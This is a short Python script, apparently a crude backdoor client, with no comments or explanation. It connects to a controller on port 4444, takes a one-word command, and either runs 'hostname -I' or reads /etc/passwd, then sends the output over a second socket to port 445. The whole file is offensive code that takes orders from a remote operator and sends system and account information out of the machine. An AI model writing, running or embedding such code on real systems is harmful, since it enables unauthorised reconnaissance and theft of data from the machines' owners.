import subprocess, socket

HOST = "0.0.0.0"
PORT = 4444
otherPort = 445

def hS():
    r = subprocess.run("hostname -I", text=True, capture_output=True, shell=True)
    out = r.stdout + r.stderr
    s = socket.socket()
    s.connect((HOST,otherPort))
    s.sendall(out.encode())
    s.close()


def pR():
    r = subprocess.run("cat /etc/passwd", text=True, capture_output=True, shell=True)
    out = r.stdout + r.stderr
    s = socket.socket()
    s.connect((HOST,otherPort))
    s.sendall(out.encode())    
    s.close()



with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.connect((HOST,PORT))
    data = sock.recv(1024)
    thing = data.decode()
    if thing == "hS":
        sock.close()
        hS()
    elif thing == "pR":
        sock.close()
        pR()